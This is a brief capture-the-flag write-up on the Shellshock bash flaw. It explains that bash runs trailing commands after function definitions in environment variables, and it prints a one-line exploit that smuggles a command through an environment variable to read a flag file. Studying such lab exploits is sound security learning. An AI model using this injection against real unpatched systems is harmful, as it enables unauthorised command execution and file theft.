# Shellshock
## Solution
The server uses a vulnerable bash version. This vulnerability, called shellshock, allows arbitrary commands to be executed via environment variables. 

The vulnerability is caused by Bash processing trailing strings after function definitions in environment variable values.

![alt text](https://news.sophos.com/wp-content/uploads/2014/10/sophos-bash-shellshock-infographic-web-plus-size1.jpg)

## Usage
```
exploit: env t='() { :; }; cat /home/shellshock/flag' ./shellshock
```